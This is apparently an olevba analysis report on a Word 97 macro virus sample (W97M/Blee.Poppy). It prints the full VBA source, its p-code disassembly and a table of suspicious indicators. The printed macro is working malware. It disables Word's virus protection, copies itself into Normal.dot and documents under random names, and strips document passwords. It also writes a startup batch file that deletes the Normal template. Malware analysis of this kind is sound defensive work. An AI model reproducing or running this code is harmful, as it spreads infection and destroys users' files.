olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Poppy.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Poppy.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Poppy.c - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub Main()

'W97M/Blee.Poppy
'By VicodinES
'Macro Virus for Word 97
'"Mad Sloppy Code For A Sloppy Big Red Mess"

Randomize

fm = Int(Rnd * 3) + 2

Mrn1 = Int(Rnd * 8) + 1
Mrn2 = Int(Rnd * 8) + 1
Mrn3 = Int(Rnd * 8) + 1
Brn = Int(Rnd * 100) + 1

If Mrn2 = Mrn3 Then Mrn2 = Mrn2 + 1
If Mrn2 = Mrn1 Then Mrn2 = Mrn2 + 1
If Mrn2 > 8 Then Mrn2 = 0

If Mrn1 = Mrn3 Then Mrn1 = Mrn1 + 1
If Mrn1 = Mrn2 Then Mrn1 = Mrn1 + 1
If Mrn1 > 8 Then Mrn1 = 0

If Mrn3 = Mrn1 Then Mrn3 = Mrn3 + 1
If Mrn3 = Mrn2 Then Mrn3 = Mrn3 + 1
If Mrn3 > 8 Then Mrn3 = 0

If Mrn2 = Mrn3 Then Mrn2 = 0
If Mrn3 = Mrn2 Then Mrn2 = Mrn2 + 1
If Mrn1 = Mrn2 Then Mrn2 = Mrn2 + 1


If Mrn1 = 0 Then rename$ = "ToolsOptions"
If Mrn1 = 1 Then rename$ = "AutoClose"
If Mrn1 = 2 Then rename$ = "FileTemplates"
If Mrn1 = 3 Then rename$ = "ToolsMacro"
If Mrn1 = 4 Then rename$ = "AutoOpen"
If Mrn1 = 5 Then rename$ = "HelpAbout"
If Mrn1 = 6 Then rename$ = "AutoExec"
If Mrn1 = 7 Then rename$ = "ViewVBCode"
If Mrn1 = 8 Then rename$ = "AutoExit"

If Mrn2 = 0 Then rename2$ = "ToolsOptions"
If Mrn2 = 1 Then rename2$ = "AutoClose"
If Mrn2 = 2 Then rename2$ = "FileTemplates"
If Mrn2 = 3 Then rename2$ = "ToolsMacro"
If Mrn2 = 4 Then rename2$ = "AutoOpen"
If Mrn2 = 5 Then rename2$ = "HelpAbout"
If Mrn2 = 6 Then rename2$ = "AutoExec"
If Mrn2 = 7 Then rename2$ = "ViewVBCode"
If Mrn2 = 8 Then rename2$ = "AutoExit"


If Mrn3 = 0 Then rename3$ = "ToolsOptions"
If Mrn3 = 1 Then rename3$ = "AutoClose"
If Mrn3 = 2 Then rename3$ = "FileTemplates"
If Mrn3 = 3 Then rename3$ = "ToolsMacro"
If Mrn3 = 4 Then rename3$ = "AutoOpen"
If Mrn3 = 5 Then rename3$ = "HelpAbout"
If Mrn3 = 6 Then rename3$ = "AutoExec"
If Mrn3 = 7 Then rename3$ = "ViewVBCode"
If Mrn3 = 8 Then rename3$ = "AutoExit"

With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With

On Error Resume Next
    

    ok$ = 0
    
    Soma$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))

    nfat = GetAttr(NormalTemplate.FullName)
    
    If nfat = vbReadOnly Then Call vBitchES("c:\windows\startm~1\programs\startup\msfile.bat")
    If nfat = vbReadOnly + vbArchive Then Call vBitchES("c:\windows\startm~1\programs\startup\msfile.bat")
 
    If nfat = vbReadOnly Then GoTo fuckoff
    If nfat = vbReadOnly + vbArchive Then GoTo fuckoff

    If Soma$ = UCase(NormalTemplate) Then
        
        fat = GetAttr(ActiveDocument.FullName)
        ao$ = WordBasic.[MacroName$](fm, 0)
        
        If fat >= vbArchive Then ok$ = 1
        If fat >= vbSystem Then ok$ = 1
        If fat >= vbHidden Then ok$ = 1
        If ok$ = 1 Then
        

            If rename$ = "AutoOpen" Then backup$ = "VicodinES"
            If rename2$ = "AutoOpen" Then backup$ = "VicodinES"
            If ao$ = "AutoOpen" Then backup$ = "VicodinES"
            If backup$ <> "VicodinES" Then backup$ = "AutoOpen"
            
        For X = 1 To 3
        
            If X = 1 Then Mac$ = rename$
            If X = 2 Then Mac$ = rename2$
            If X = 3 Then Mac$ = backup$
            
            Application.OrganizerCopy Source:= _
        NormalTemplate.FullName, Destination:= _
        ActiveDocument.FullName, Name:=ao$, Object:= _
        wdOrganizerObjectProjectItems
            
            Application.OrganizerRename Source:= _
        ActiveDocument.FullName, Name:=ao$, _
        NewName:=Mac$, Object:= _
        wdOrganizerObjectProjectItems

            Next X
            
            Application.OrganizerCopy Source:= _
        NormalTemplate.FullName, Destination:= _
        ActiveDocument.FullName, Name:=ao$, Object:= _
        wdOrganizerObjectProjectItems
        
            WordBasic.FileSaveAs Format:=1
            WordBasic.SetDocumentDirty 0
            
        End If
    Else
               
        ao$ = "AutoOpen"
       
        For X = 1 To 3
        
            If X = 1 Then Mac$ = rename$
            If X = 2 Then Mac$ = rename2$
            If X = 3 Then Mac$ = rename3$
            
        Application.OrganizerCopy Source:= _
        ActiveDocument.FullName, Destination:= _
        NormalTemplate.FullName, Name:=ao$, Object:= _
        wdOrganizerObjectProjectItems
        
        Application.OrganizerRename Source:= _
        NormalTemplate.FullName, Name:=ao$, _
        NewName:=Mac$, Object:= _
        wdOrganizerObjectProjectItems
        
        Next X
        

        Application.OrganizerCopy Source:= _
        ActiveDocument.FullName, Destination:= _
        NormalTemplate.FullName, Name:=ao$, Object:= _
        wdOrganizerObjectProjectItems
        
    End If
    
    With ActiveDocument
        .ReadOnlyRecommended = False
        .Password = ""
        .WritePassword = ""
    End With

GoTo fuckoff

Hell:
        
fuckoff:
    On Error GoTo -1: On Error GoTo 0

End Sub
Sub vBitchES(strFile As String)
 
 Dim hFile As Long

 n$ = NormalTemplate
 Part1$ = "@echo off"
 Part11$ = "attrib -h -r "
 snag$ = "c:\progra~1\micros~1\templa~1\"
 snag1$ = "c:\progra~1\micros~2\templa~1\"
 Part2$ = "del "
 Part33$ = "cls"
 Part333$ = "c:\windows\startm~1\programs\startup\msfile.bat"
 
     hFile = FreeFile
     Open strFile For Output Access Write As hFile
     Print #hFile, Part1$
     Print #hFile, Part11$ + snag$ + n$
     Print #hFile, Part11$ + snag1$ + n$
     Print #hFile, Part2$ + snag$ + n$
     Print #hFile, Part2$ + snag1$ + n$
     Print #hFile, Part33$
     Print #hFile, Part2$ + Part333$
     Close hFile
     
     GoTo Hell
     
Hell:

End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Poppy.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/AutoOpen - 12306 bytes
' Line #0:
' 	FuncDefn (Public Sub Main())
' Line #1:
' Line #2:
' 	QuoteRem 0x0000 0x000F "W97M/Blee.Poppy"
' Line #3:
' 	QuoteRem 0x0000 0x000C "By VicodinES"
' Line #4:
' 	QuoteRem 0x0000 0x0017 "Macro Virus for Word 97"
' Line #5:
' 	QuoteRem 0x0000 0x002B ""Mad Sloppy Code For A Sloppy Big Red Mess""
' Line #6:
' Line #7:
' 	ArgsCall Read 0x0000 
' Line #8:
' Line #9:
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0002 
' 	Add 
' 	St fm 
' Line #10:
' Line #11:
' 	Ld Rnd 
' 	LitDI2 0x0008 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St Mrn1 
' Line #12:
' 	Ld Rnd 
' 	LitDI2 0x0008 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St Mrn2 
' Line #13:
' 	Ld Rnd 
' 	LitDI2 0x0008 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St Mrn3 
' Line #14:
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St Brn 
' Line #15:
' Line #16:
' 	Ld Mrn2 
' 	Ld Mrn3 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Mrn2 
' 	LitDI2 0x0001 
' 	Add 
' 	St Mrn2 
' 	EndIf 
' Line #17:
' 	Ld Mrn2 
' 	Ld Mrn1 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Mrn2 
' 	LitDI2 0x0001 
' 	Add 
' 	St Mrn2 
' 	EndIf 
' Line #18:
' 	Ld Mrn2 
' 	LitDI2 0x0008 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	St Mrn2 
' 	EndIf 
' Line #19:
' Line #20:
' 	Ld Mrn1 
' 	Ld Mrn3 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Mrn1 
' 	LitDI2 0x0001 
' 	Add 
' 	St Mrn1 
' 	EndIf 
' Line #21:
' 	Ld Mrn1 
' 	Ld Mrn2 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Mrn1 
' 	LitDI2 0x0001 
' 	Add 
' 	St Mrn1 
' 	EndIf 
' Line #22:
' 	Ld Mrn1 
' 	LitDI2 0x0008 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	St Mrn1 
' 	EndIf 
' Line #23:
' Line #24:
' 	Ld Mrn3 
' 	Ld Mrn1 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Mrn3 
' 	LitDI2 0x0001 
' 	Add 
' 	St Mrn3 
' 	EndIf 
' Line #25:
' 	Ld Mrn3 
' 	Ld Mrn2 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Mrn3 
' 	LitDI2 0x0001 
' 	Add 
' 	St Mrn3 
' 	EndIf 
' Line #26:
' 	Ld Mrn3 
' 	LitDI2 0x0008 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	St Mrn3 
' 	EndIf 
' Line #27:
' Line #28:
' 	Ld Mrn2 
' 	Ld Mrn3 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	St Mrn2 
' 	EndIf 
' Line #29:
' 	Ld Mrn3 
' 	Ld Mrn2 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Mrn2 
' 	LitDI2 0x0001 
' 	Add 
' 	St Mrn2 
' 	EndIf 
' Line #30:
' 	Ld Mrn1 
' 	Ld Mrn2 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Mrn2 
' 	LitDI2 0x0001 
' 	Add 
' 	St Mrn2 
' 	EndIf 
' Line #31:
' Line #32:
' Line #33:
' 	Ld Mrn1 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000C "ToolsOptions"
' 	St rename$ 
' 	EndIf 
' Line #34:
' 	Ld Mrn1 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "AutoClose"
' 	St rename$ 
' 	EndIf 
' Line #35:
' 	Ld Mrn1 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000D "FileTemplates"
' 	St rename$ 
' 	EndIf 
' Line #36:
' 	Ld Mrn1 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000A "ToolsMacro"
' 	St rename$ 
' 	EndIf 
' Line #37:
' 	Ld Mrn1 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "AutoOpen"
' 	St rename$ 
' 	EndIf 
' Line #38:
' 	Ld Mrn1 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "HelpAbout"
' 	St rename$ 
' 	EndIf 
' Line #39:
' 	Ld Mrn1 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "AutoExec"
' 	St rename$ 
' 	EndIf 
' Line #40:
' 	Ld Mrn1 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000A "ViewVBCode"
' 	St rename$ 
' 	EndIf 
' Line #41:
' 	Ld Mrn1 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "AutoExit"
' 	St rename$ 
' 	EndIf 
' Line #42:
' Line #43:
' 	Ld Mrn2 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000C "ToolsOptions"
' 	St rename2$ 
' 	EndIf 
' Line #44:
' 	Ld Mrn2 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "AutoClose"
' 	St rename2$ 
' 	EndIf 
' Line #45:
' 	Ld Mrn2 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000D "FileTemplates"
' 	St rename2$ 
' 	EndIf 
' Line #46:
' 	Ld Mrn2 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000A "ToolsMacro"
' 	St rename2$ 
' 	EndIf 
' Line #47:
' 	Ld Mrn2 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "AutoOpen"
' 	St rename2$ 
' 	EndIf 
' Line #48:
' 	Ld Mrn2 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "HelpAbout"
' 	St rename2$ 
' 	EndIf 
' Line #49:
' 	Ld Mrn2 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "AutoExec"
' 	St rename2$ 
' 	EndIf 
' Line #50:
' 	Ld Mrn2 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000A "ViewVBCode"
' 	St rename2$ 
' 	EndIf 
' Line #51:
' 	Ld Mrn2 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "AutoExit"
' 	St rename2$ 
' 	EndIf 
' Line #52:
' Line #53:
' Line #54:
' 	Ld Mrn3 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000C "ToolsOptions"
' 	St rename3$ 
' 	EndIf 
' Line #55:
' 	Ld Mrn3 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "AutoClose"
' 	St rename3$ 
' 	EndIf 
' Line #56:
' 	Ld Mrn3 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000D "FileTemplates"
' 	St rename3$ 
' 	EndIf 
' Line #57:
' 	Ld Mrn3 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000A "ToolsMacro"
' 	St rename3$ 
' 	EndIf 
' Line #58:
' 	Ld Mrn3 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "AutoOpen"
' 	St rename3$ 
' 	EndIf 
' Line #59:
' 	Ld Mrn3 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "HelpAbout"
' 	St rename3$ 
' 	EndIf 
' Line #60:
' 	Ld Mrn3 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "AutoExec"
' 	St rename3$ 
' 	EndIf 
' Line #61:
' 	Ld Mrn3 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000A "ViewVBCode"
' 	St rename3$ 
' 	EndIf 
' Line #62:
' 	Ld Mrn3 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "AutoExit"
' 	St rename3$ 
' 	EndIf 
' Line #63:
' Line #64:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #66:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #67:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #68:
' 	EndWith 
' Line #69:
' Line #70:
' 	OnError (Resume Next) 
' Line #71:
' Line #72:
' Line #73:
' 	LitDI2 0x0000 
' 	St ok$ 
' Line #74:
' Line #75:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroFileName$] 0x0001 
' 	LitDI2 0x000A 
' 	Ld WordBasic 
' 	ArgsMemLd [Right$] 0x0002 
' 	ArgsLd UCase 0x0001 
' 	St Soma$ 
' Line #76:
' Line #77:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	St nfat 
' Line #78:
' Line #79:
' 	Ld nfat 
' 	Ld vbReadOnly 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x002F "c:\windows\startm~1\programs\startup\msfile.bat"
' 	ArgsCall (Call) vBitchES 0x0001 
' 	EndIf 
' Line #80:
' 	Ld nfat 
' 	Ld vbReadOnly 
' 	Ld vbArchive 
' 	Add 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x002F "c:\windows\startm~1\programs\startup\msfile.bat"
' 	ArgsCall (Call) vBitchES 0x0001 
' 	EndIf 
' Line #81:
' Line #82:
' 	Ld nfat 
' 	Ld vbReadOnly 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo fuckoff 
' 	EndIf 
' Line #83:
' 	Ld nfat 
' 	Ld vbReadOnly 
' 	Ld vbArchive 
' 	Add 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo fuckoff 
' 	EndIf 
' Line #84:
' Line #85:
' 	Ld Soma$ 
' 	Ld NormalTemplate 
' 	ArgsLd UCase 0x0001 
' 	Eq 
' 	IfBlock 
' Line #86:
' Line #87:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	St fat 
' Line #88:
' 	Ld fm 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	St ao$ 
' Line #89:
' Line #90:
' 	Ld fat 
' 	Ld vbArchive 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St ok$ 
' 	EndIf 
' Line #91:
' 	Ld fat 
' 	Ld vbSystem 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St ok$ 
' 	EndIf 
' Line #92:
' 	Ld fat 
' 	Ld vbHidden 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St ok$ 
' 	EndIf 
' Line #93:
' 	Ld ok$ 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #94:
' Line #95:
' Line #96:
' 	Ld rename$ 
' 	LitStr 0x0008 "AutoOpen"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "VicodinES"
' 	St backup$ 
' 	EndIf 
' Line #97:
' 	Ld rename2$ 
' 	LitStr 0x0008 "AutoOpen"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "VicodinES"
' 	St backup$ 
' 	EndIf 
' Line #98:
' 	Ld ao$ 
' 	LitStr 0x0008 "AutoOpen"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "VicodinES"
' 	St backup$ 
' 	EndIf 
' Line #99:
' 	Ld backup$ 
' 	LitStr 0x0009 "VicodinES"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "AutoOpen"
' 	St backup$ 
' 	EndIf 
' Line #100:
' Line #101:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	For 
' Line #102:
' Line #103:
' 	Ld X 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld rename$ 
' 	St Mac$ 
' 	EndIf 
' Line #104:
' 	Ld X 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld rename2$ 
' 	St Mac$ 
' 	EndIf 
' Line #105:
' 	Ld X 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld backup$ 
' 	St Mac$ 
' 	EndIf 
' Line #106:
' Line #107:
' 	LineCont 0x000C 05 00 08 00 0B 00 08 00 15 00 08 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld ao$ 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #108:
' Line #109:
' 	LineCont 0x000C 05 00 08 00 0D 00 08 00 13 00 08 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ao$ 
' 	ParamNamed New 
' 	Ld Mac$ 
' 	ParamNamed NewName 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #110:
' Line #111:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' Line #112:
' Line #113:
' 	LineCont 0x000C 05 00 08 00 0B 00 08 00 15 00 08 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld ao$ 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #114:
' Line #115:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #116:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall SetDocumentDirty 0x0001 
' Line #117:
' Line #118:
' 	EndIfBlock 
' Line #119:
' 	ElseBlock 
' Line #120:
' Line #121:
' 	LitStr 0x0008 "AutoOpen"
' 	St ao$ 
' Line #122:
' Line #123:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	For 
' Line #124:
' Line #125:
' 	Ld X 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld rename$ 
' 	St Mac$ 
' 	EndIf 
' Line #126:
' 	Ld X 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld rename2$ 
' 	St Mac$ 
' 	EndIf 
' Line #127:
' 	Ld X 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld rename3$ 
' 	St Mac$ 
' 	EndIf 
' Line #128:
' Line #129:
' 	LineCont 0x000C 05 00 08 00 0B 00 08 00 15 00 08 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld ao$ 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #130:
' Line #131:
' 	LineCont 0x000C 05 00 08 00 0D 00 08 00 13 00 08 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ao$ 
' 	ParamNamed New 
' 	Ld Mac$ 
' 	ParamNamed NewName 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #132:
' Line #133:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' Line #134:
' Line #135:
' Line #136:
' 	LineCont 0x000C 05 00 08 00 0B 00 08 00 15 00 08 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld ao$ 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #137:
' Line #138:
' 	EndIfBlock 
' Line #139:
' Line #140:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #141:
' 	LitVarSpecial (False)
' 	MemStWith ReadOnlyRecommended 
' Line #142:
' 	LitStr 0x0000 ""
' 	MemStWith Password 
' Line #143:
' 	LitStr 0x0000 ""
' 	MemStWith WritePassword 
' Line #144:
' 	EndWith 
' Line #145:
' Line #146:
' 	GoTo fuckoff 
' Line #147:
' Line #148:
' 	Label Hell 
' Line #149:
' Line #150:
' 	Label fuckoff 
' Line #151:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError (GoTo 0) 
' Line #152:
' Line #153:
' 	EndSub 
' Line #154:
' 	FuncDefn (Sub vBitchES(strFile As String))
' Line #155:
' Line #156:
' 	Dim 
' 	VarDefn hFile (As Long)
' Line #157:
' Line #158:
' 	Ld NormalTemplate 
' 	St n$ 
' Line #159:
' 	LitStr 0x0009 "@echo off"
' 	St Part1$ 
' Line #160:
' 	LitStr 0x000D "attrib -h -r "
' 	St Part11$ 
' Line #161:
' 	LitStr 0x001E "c:\progra~1\micros~1\templa~1\"
' 	St snag$ 
' Line #162:
' 	LitStr 0x001E "c:\progra~1\micros~2\templa~1\"
' 	St snag1$ 
' Line #163:
' 	LitStr 0x0004 "del "
' 	St Part2$ 
' Line #164:
' 	LitStr 0x0003 "cls"
' 	St Part33$ 
' Line #165:
' 	LitStr 0x002F "c:\windows\startm~1\programs\startup\msfile.bat"
' 	St Part333$ 
' Line #166:
' Line #167:
' 	Ld Friend 
' 	St hFile 
' Line #168:
' 	Ld strFile 
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #169:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part1$ 
' 	PrintItemNL 
' Line #170:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part11$ 
' 	Ld snag$ 
' 	Add 
' 	Ld n$ 
' 	Add 
' 	PrintItemNL 
' Line #171:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part11$ 
' 	Ld snag1$ 
' 	Add 
' 	Ld n$ 
' 	Add 
' 	PrintItemNL 
' Line #172:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part2$ 
' 	Ld snag$ 
' 	Add 
' 	Ld n$ 
' 	Add 
' 	PrintItemNL 
' Line #173:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part2$ 
' 	Ld snag1$ 
' 	Add 
' 	Ld n$ 
' 	Add 
' 	PrintItemNL 
' Line #174:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part33$ 
' 	PrintItemNL 
' Line #175:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part2$ 
' 	Ld Part333$ 
' 	Add 
' 	PrintItemNL 
' Line #176:
' 	Ld hFile 
' 	Close 0x0001 
' Line #177:
' Line #178:
' 	GoTo Hell 
' Line #179:
' Line #180:
' 	Label Hell 
' Line #181:
' Line #182:
' 	EndSub 
' Line #183:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |msfile.bat          |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

